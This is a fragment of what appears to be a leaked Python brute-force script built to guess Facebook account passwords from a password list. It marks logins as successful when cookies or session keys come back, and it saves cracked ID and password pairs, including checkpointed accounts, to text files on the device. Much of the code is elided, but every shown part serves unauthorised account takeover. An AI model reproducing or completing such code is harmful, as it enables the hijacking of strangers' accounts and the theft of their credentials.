#SOURCE LEAKED BY : MD JIBON ISLAM
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [𝐉𝐢𝐛𝐨𝐧] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [𝐉𝐢𝐛𝐨𝐧-OK] %s | %s'%(ids,pas))
                                open('/sdcard/jibon550-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [𝐉𝐢𝐛𝐨𝐧-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/jibon550-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
    ...
    "user-agent": ua,
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [𝐉𝐢𝐛𝐨𝐧-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/jibon550-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def rndm(ids,passlist):
    ...
    "user-agent": ua,
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/jibon550-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [𝐉𝐢𝐛𝐨𝐧-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/jibon550-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [𝐉𝐢𝐛𝐨𝐧-OK] '+uid+' | '+pas+'\033[1;97m')
